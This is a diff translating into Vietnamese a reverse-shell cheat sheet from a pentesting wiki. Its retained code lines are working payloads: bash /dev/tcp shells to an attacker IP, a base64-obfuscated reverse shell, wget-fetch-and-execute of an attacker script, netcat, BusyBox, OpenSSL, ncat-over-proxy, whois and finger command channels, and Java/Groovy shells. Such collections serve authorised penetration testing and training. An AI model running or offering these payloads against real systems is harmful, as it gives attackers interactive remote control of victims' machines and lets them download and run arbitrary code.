@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>
+**Nếu có câu hỏi về bất kỳ shell nào trong số này, bạn có thể kiểm tra bằng** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>
 
 ## Full TTY
 
-**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
+**Sau khi có reverse shell**[ **hãy đọc trang này để có Full TTY**](full-ttys.md)**.**
 
-The baseline reverse-shell payloads collected below are also documented in the HighOn.Coffee and PayloadsAllTheThings cheat sheets; verify interpreter and utility availability on the target before selecting one.<sup>[[1]](#references)[[4]](#references)</sup>
+Các payload reverse shell cơ bản được liệt kê bên dưới cũng được ghi lại trong cheat sheet của HighOn.Coffee và PayloadsAllTheThings; hãy kiểm tra xem interpreter và tiện ích có sẵn trên mục tiêu hay không trước khi chọn payload.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## Bash | sh
 
@@ -25,9 +25,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 exec >&0
 ```
 
-Don't forget to check with other shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.
+Đừng quên kiểm tra với các shell khác: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh và bash.
 
-### Symbol safe shell
+### Shell an toàn với ký hiệu
 
 ```bash
 #If you need a more stable connection do:
@@ -38,17 +38,17 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
 
-#### Shell explanation
+#### Giải thích về shell
 
-The following points summarize Bash's documented interactive and redirection behavior:<sup>[[10]](#references)[[11]](#references)</sup>
+Các điểm sau đây tóm tắt hành vi tương tác và chuyển hướng đã được tài liệu hóa của Bash:<sup>[[10]](#references)[[11]](#references)</sup>
 
-1. **`bash -i`**: This part of the command starts an interactive (`-i`) Bash shell.
-2. **`>&`**: This part of the command is a shorthand notation for **redirecting both standard output** (`stdout`) and **standard error** (`stderr`) to the **same destination**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: This is a special file that **represents a TCP connection to the specified IP address and port**.
-   - By **redirecting the output and error streams to this file**, the command effectively sends the output of the interactive shell session to the attacker's machine.
-4. **`0>&1`**: This part of the command **redirects standard input (`stdin`) to the same destination as standard output (`stdout`)**.
+1. **`bash -i`**: Phần này của lệnh khởi chạy một shell Bash tương tác (`-i`).
+2. **`>&`**: Phần này của lệnh là ký hiệu viết tắt để **chuyển hướng cả đầu ra tiêu chuẩn** (`stdout`) và **lỗi tiêu chuẩn** (`stderr`) đến **cùng một đích**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Đây là một tệp đặc biệt **đại diện cho kết nối TCP đến địa chỉ IP và cổng được chỉ định**.
+   - Bằng cách **chuyển hướng các luồng đầu ra và lỗi đến tệp này**, lệnh sẽ gửi đầu ra của phiên shell tương tác đến máy của kẻ tấn công.
+4. **`0>&1`**: Phần này của lệnh **chuyển hướng đầu vào tiêu chuẩn (`stdin`) đến cùng đích với đầu ra tiêu chuẩn (`stdout`)**.
 
-### Create in file and execute
+### Tạo trong tệp và thực thi
 
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
@@ -57,11 +57,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 ## Forward Shell
 
-When RCE is available but a reverse shell is blocked by a firewall, NAT, or outbound filtering, a forward shell over the RCE channel can provide a semi-interactive session.<sup>[[12]](#references)</sup>
+Khi có RCE nhưng reverse shell bị firewall, NAT hoặc bộ lọc outbound chặn, forward shell qua kênh RCE có thể cung cấp một phiên tương tác bán phần.<sup>[[12]](#references)</sup>
 
-A recommended tool for this purpose is [toboggan](https://github.com/n3rada/toboggan.git), which wraps a command-execution primitive in an interactive session.<sup>[[12]](#references)</sup>
+Một công cụ được khuyên dùng cho mục đích này là [toboggan](https://github.com/n3rada/toboggan.git), công cụ này bao bọc một primitive thực thi lệnh trong một phiên tương tác.<sup>[[12]](#references)</sup>
 
-To use toboggan, create a Python module tailored to the RCE context of your target system; its module interface expects an `execute(command, timeout)` function that returns command output.<sup>[[12]](#references)</sup> For example, a module named `nix.py` could be structured as follows:
+Để sử dụng toboggan, hãy tạo một Python module phù hợp với ngữ cảnh RCE của hệ thống mục tiêu; interface của module yêu cầu một hàm `execute(command, timeout)` trả về đầu ra của lệnh.<sup>[[12]](#references)</sup> Ví dụ, một module có tên `nix.py` có thể được cấu trúc như sau:
 
 ```python3
 import jwt
@@ -87,23 +87,23 @@ def execute(command: str, timeout: float = None) -> str:
     return response.text
 ```
 
-Run the module with toboggan's current command-line form:<sup>[[12]](#references)</sup>
+Chạy module bằng cú pháp dòng lệnh hiện tại của toboggan:<sup>[[12]](#references)</sup>
 
 ```shell
 toboggan nix.py
 ```
 
-This starts the interactive session. For the built-in Burp Suite backend, use `toboggan --request burp_request.xml`; for a command-wrapper backend, use `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>
+Điều này bắt đầu phiên tương tác. Với backend tích hợp sẵn của Burp Suite, dùng `toboggan --request burp_request.xml`; với backend command-wrapper, dùng `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>
 
-Another possibility is the `IppSec` forward-shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>
+Một lựa chọn khác là implementation forward-shell của `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>
 
-You need to modify the following parts:<sup>[[13]](#references)</sup>
+Bạn cần chỉnh sửa các phần sau:<sup>[[13]](#references)</sup>
 
-- The URL of the vulnerable host
-- The prefix and suffix of your payload (if any)
-- The way the payload is sent (headers? data? extra info?)
+- URL của host dễ bị tấn công
+- Prefix và suffix của payload (nếu có)
+- Cách gửi payload (headers? data? thông tin bổ sung?)
 
-Then, you can **send commands** or use the **`upgrade` command** to get a full PTY; the implementation polls the output with an approximate 1.3-second interval.<sup>[[13]](#references)</sup>
+Sau đó, bạn có thể **gửi lệnh** hoặc dùng **lệnh `upgrade`** để có một PTY đầy đủ; implementation kiểm tra output theo khoảng thời gian xấp xỉ 1,3 giây.<sup>[[13]](#references)</sup>
 
 ## Netcat
 
@@ -117,7 +117,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 
 ## BusyBox
 
-BusyBox combines many utilities into one small executable and is common on small or embedded Linux systems. If there is no standalone `nc`, check whether BusyBox exposes it:<sup>[[8]](#references)[[19]](#references)</sup>
+BusyBox gộp nhiều tiện ích vào một tệp thực thi nhỏ và thường có trên các hệ thống Linux nhỏ hoặc nhúng. Nếu không có `nc` độc lập, hãy kiểm tra xem BusyBox có cung cấp tiện ích này không:<sup>[[8]](#references)[[19]](#references)</sup>
 
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
@@ -125,7 +125,7 @@ busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
 
-If `busybox nc` exists but interactive execution is flaky, adapt the FIFO pattern from the `nc` section to that applet:<sup>[[2]](#references)[[8]](#references)</sup>
+Nếu có `busybox nc` nhưng việc thực thi tương tác không ổn định, hãy điều chỉnh mẫu FIFO từ phần `nc` cho applet này:<sup>[[2]](#references)[[8]](#references)</sup>
 
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
@@ -133,7 +133,7 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <
 
 ## gsocket
 
-Check the official deployment instructions at [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
+Xem hướng dẫn triển khai chính thức tại [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
 
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
@@ -150,15 +150,15 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 
 ## Whois
 
-**Attacker**
+**Kẻ tấn công**
 
 ```bash
 while true; do nc -l <port>; done
 ```
 
-Use the same Enter/CTRL+D input sequence described in the Whois section.<sup>[[3]](#references)</sup>
+Sử dụng cùng chuỗi đầu vào Enter/CTRL+D được mô tả trong phần Whois.<sup>[[3]](#references)</sup>
 
-**Victim**
+**Nạn nhân**
 
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
@@ -217,9 +217,9 @@ victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
 attacker> ncat -l <port,eg.443> --ssl
 ```
 
-### Through an explicit outbound proxy
+### Thông qua proxy outbound được chỉ định rõ
 
-If the target can reach an HTTP `CONNECT` or SOCKS proxy but cannot open a direct TCP connection to the listener, use **Ncat** in connect mode. The proxy must allow a tunnel to the listener's host and port; `CONNECT` only forwards bytes after setup, so a plain shell is **not** HTTP traffic or encrypted merely because it uses an HTTP proxy.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>
+Nếu target có thể truy cập proxy HTTP `CONNECT` hoặc SOCKS nhưng không thể mở kết nối TCP trực tiếp đến listener, hãy dùng **Ncat** ở chế độ connect. Proxy phải cho phép tunnel đến host và port của listener; `CONNECT` chỉ chuyển tiếp byte sau khi thiết lập, vì vậy shell thuần **không** phải là lưu lượng HTTP và cũng không được mã hóa chỉ vì sử dụng proxy HTTP.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>
 
 ```bash
 # Attacker: expose a listener reachable from the proxy
@@ -232,7 +232,7 @@ ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <AT
 ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
 ```
 
-For an authenticated proxy, Ncat accepts `--proxy-auth` or `NCAT_PROXY_AUTH` (the latter avoids putting credentials in command arguments).<sup>[[23]](#references)</sup> Destination hostnames are resolved by the proxy by default; use `--proxy-dns local` only when local resolution is required.<sup>[[23]](#references)</sup> If the proxy enforces TLS or application protocols beyond `CONNECT`, use an appropriate encrypted transport rather than assuming that port 443 disguises a raw shell; see [tunneling and port forwarding](../tunneling-and-port-forwarding.md) for WebSocket-based transport.<sup>[[22]](#references)[[24]](#references)</sup>
+Đối với proxy đã xác thực, Ncat chấp nhận `--proxy-auth` hoặc `NCAT_PROXY_AUTH` (cách thứ hai tránh đưa thông tin xác thực vào các đối số lệnh).<sup>[[23]](#references)</sup> Theo mặc định, proxy phân giải tên máy chủ đích; chỉ dùng `--proxy-dns local` khi cần phân giải cục bộ.<sup>[[23]](#references)</sup> Nếu proxy yêu cầu TLS hoặc các giao thức ứng dụng ngoài `CONNECT`, hãy dùng phương thức truyền tải được mã hóa phù hợp thay vì cho rằng cổng 443 có thể ngụy trang một raw shell; xem [tunneling and port forwarding](../tunneling-and-port-forwarding.md) để biết phương thức truyền tải dựa trên WebSocket.<sup>[[22]](#references)[[24]](#references)</sup>
 
 ## Golang
 
@@ -294,7 +294,7 @@ or
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
-## Zsh (built-in TCP)
+## Zsh (TCP tích hợp sẵn)
 
 ```bash
 # Requires no external binaries; leverages zsh/net/tcp module
@@ -303,7 +303,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – modern netcat-like listener written in Rust.<sup>[[5]](#references)</sup>
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener hiện đại kiểu netcat được viết bằng Rust.<sup>[[5]](#references)</sup>
 
 ```bash
 # Attacker – interactive listener with history & tab-completion
@@ -315,13 +315,13 @@ curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-l
   && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
 
-Features documented by the project include:<sup>[[5]](#references)</sup>
-- Command history and tab completion in interactive mode
-- `-s` to select the shell executable used by `connect`
+Các tính năng được dự án ghi lại gồm:<sup>[[5]](#references)</sup>
+- Lịch sử lệnh và tự động hoàn thành bằng phím Tab ở chế độ tương tác
+- `-s` để chọn shell executable mà `connect` sử dụng
 
 ## pwncat-cs
 
-If you already have **any raw reverse shell** but want a listener that can set up a more usable session, `pwncat-cs` can handle the connection and attempt a remote PTY.<sup>[[7]](#references)</sup>
+Nếu bạn đã có **bất kỳ raw reverse shell nào** nhưng muốn một listener có thể thiết lập phiên dễ sử dụng hơn, `pwncat-cs` có thể xử lý kết nối và thử tạo PTY từ xa.<sup>[[7]](#references)</sup>
 
 ```bash
 # Attacker - catch a plain reverse shell and auto-upgrade it when possible
@@ -332,11 +332,11 @@ pwncat-cs -lp 4444
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
 
-It also supports **encrypted** `ssl-bind` and `ssl-connect` channels, so you can pair it with `ncat --ssl` or `socat OPENSSL:` payloads when you need transport encryption.<sup>[[7]](#references)</sup>
+Nó cũng hỗ trợ các kênh `ssl-bind` và `ssl-connect` **được mã hóa**, nên bạn có thể kết hợp với payload `ncat --ssl` hoặc `socat OPENSSL:` khi cần mã hóa lưu lượng truyền tải.<sup>[[7]](#references)</sup>
 
-## revsh (encrypted & pivot-ready)
+## revsh (được mã hóa và sẵn sàng pivot)
 
-`revsh` is a tiny C client/server that provides a full TTY over an **encrypted Diffie-Hellman tunnel** and can optionally attach a **TUN/TAP** interface for reverse VPN-like pivoting.<sup>[[6]](#references)</sup>
+`revsh` là một client/server C nhỏ gọn, cung cấp TTY đầy đủ qua **đường hầm Diffie-Hellman được mã hóa** và có thể tùy chọn gắn giao diện **TUN/TAP** để pivoting ngược kiểu VPN.<sup>[[6]](#references)</sup>
 
 ```bash
 # Build after preparing the OpenSSL dependency as described in the repository README
@@ -349,25 +349,25 @@ revsh -c 0.0.0.0:443
 ./revsh <ATTACKER-IP>:443
 ```
 
-Useful flags documented by `revsh` include:<sup>[[6]](#references)</sup>
-- `-b`: bind-shell mode (enable it on both ends)
-- `-D [LHOST:]LPORT` or `-B [RHOST:]RPORT`: dynamic SOCKS 4/4a/5 forwarding
-- `-x`: disable automatic setup of proxies, including the default TUN/TAP setup
+Các flag hữu ích được tài liệu `revsh` ghi lại gồm:<sup>[[6]](#references)</sup>
+- `-b`: chế độ bind-shell (bật ở cả hai đầu)
+- `-D [LHOST:]LPORT` hoặc `-B [RHOST:]RPORT`: chuyển tiếp SOCKS 4/4a/5 động
+- `-x`: tắt tự động thiết lập proxy, bao gồm thiết lập TUN/TAP mặc định
 
-The encrypted tunnel avoids exposing shell traffic as plaintext, but it does not bypass network policy by itself.<sup>[[6]](#references)</sup>
+Tunnel được mã hóa giúp tránh để lộ lưu lượng shell dưới dạng plaintext, nhưng bản thân nó không vượt qua chính sách mạng.<sup>[[6]](#references)</sup>
 
 ## OpenSSL
 
-This section uses OpenSSL's `req`, `s_server`, and `s_client` commands to create a certificate and carry a shell over TLS.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
+Phần này sử dụng các lệnh `req`, `s_server` và `s_client` của OpenSSL để tạo certificate và truyền shell qua TLS.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
-The Attacker (Kali)
+Kẻ tấn công (Kali)
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
 ```
 
-The Victim
+Nạn nhân
 
 ```bash
 #Linux - one-port TLS shell using a named pipe
@@ -377,7 +377,7 @@ mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATT
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
 ```
 
-You can still use the classic **two-listener** pattern when you want separated input/output channels.<sup>[[16]](#references)[[17]](#references)</sup>
+Bạn vẫn có thể sử dụng mẫu **two-listener** cổ điển khi muốn tách riêng các kênh đầu vào/đầu ra.<sup>[[16]](#references)[[17]](#references)</sup>
 
 ```bash
 #Linux
@@ -413,15 +413,15 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 
 ## Finger
 
-**Attacker**
+**Kẻ tấn công**
 
 ```bash
 while true; do nc -l 79; done
 ```
 
-To send the command write it down, press enter and press CTRL+D (to stop STDIN).<sup>[[3]](#references)</sup>
+Để gửi lệnh, hãy nhập lệnh, nhấn Enter rồi nhấn CTRL+D (để dừng STDIN).<sup>[[3]](#references)</sup>
 
-**Victim**
+**Nạn nhân**
 
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
@@ -456,13 +456,13 @@ BEGIN {
 
 ## Xterm
 
-This will try to connect to your system at port 6001.<sup>[[2]](#references)</sup>
+Thao tác này sẽ thử kết nối đến hệ thống của bạn qua cổng 6001.<sup>[[2]](#references)</sup>
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
-To catch the reverse shell, use an X server listening on port 6001 as shown below.<sup>[[2]](#references)</sup>
+Để bắt reverse shell, hãy sử dụng X server đang lắng nghe trên cổng 6001 như minh họa bên dưới.<sup>[[2]](#references)</sup>
 
 ```bash
 # Authorize host
@@ -473,7 +473,7 @@ Xnest :1
 
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NOTE: Java reverse shell also work for Groovy.<sup>[[18]](#references)</sup>
+bởi [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). LƯU Ý: Java reverse shell cũng hoạt động với Groovy.<sup>[[18]](#references)</sup>
 
 ```bash
 String host="localhost";
@@ -484,29 +484,28 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ## References
 
-- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-- [3] [Using Whois and Finger for Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
-- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [5] [rustcat - The modern port listener and reverse shell](https://github.com/robiot/rustcat)
-- [6] [revsh - A reverse shell with terminal support, data tunneling, and advanced pivoting capabilities](https://github.com/emptymonkey/revsh)
-- [7] [pwncat (pwncat-cs) - post-exploitation platform](https://github.com/calebstewart/pwncat)
+- [1] [Bảng tổng hợp Reverse Shell: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [Bảng tổng hợp Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [3] [Sử dụng Whois và Finger cho Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+- [4] [PayloadsAllTheThings - Bảng tổng hợp Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [rustcat - Trình lắng nghe port hiện đại và reverse shell](https://github.com/robiot/rustcat)
+- [6] [revsh - Reverse shell hỗ trợ terminal, tunneling dữ liệu và khả năng pivoting nâng cao](https://github.com/emptymonkey/revsh)
+- [7] [pwncat (pwncat-cs) - nền tảng post-exploitation](https://github.com/calebstewart/pwncat)
 - [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
 - [9] [explainshell.com](https://explainshell.com/)
-- [10] [Bash Reference Manual: Redirections](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
-- [11] [Bash Reference Manual: Invoking Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
+- [10] [Sổ tay tham khảo Bash: Chuyển hướng](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
+- [11] [Sổ tay tham khảo Bash: Gọi Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
 - [12] [toboggan](https://github.com/n3rada/toboggan)
 - [13] [forward-shell](https://github.com/IppSec/forward-shell)
-- [14] [Global Socket deployment instructions](https://www.gsocket.io/deploy/)
+- [14] [Hướng dẫn triển khai Global Socket](https://www.gsocket.io/deploy/)
 - [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
 - [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
 - [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
-- [18] [Pure Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+- [18] [Reverse Shell thuần Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 - [19] [BusyBox](https://busybox.net/about.html)
-- [20] [Ncat Proxying](https://nmap.org/ncat/guide/ncat-proxy.html)
-- [21] [Ncat Command Execution](https://nmap.org/ncat/guide/ncat-exec.html)
+- [20] [Proxying với Ncat](https://nmap.org/ncat/guide/ncat-proxy.html)
+- [21] [Thực thi lệnh với Ncat](https://nmap.org/ncat/guide/ncat-exec.html)
 - [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
-- [23] [Ncat Reference Guide](https://nmap.org/book/ncat-man.html)
-- [24] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
-
+- [23] [Hướng dẫn tham khảo Ncat](https://nmap.org/book/ncat-man.html)
+- [24] [README của wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
 {{#include ../../banners/hacktricks-training.md}}
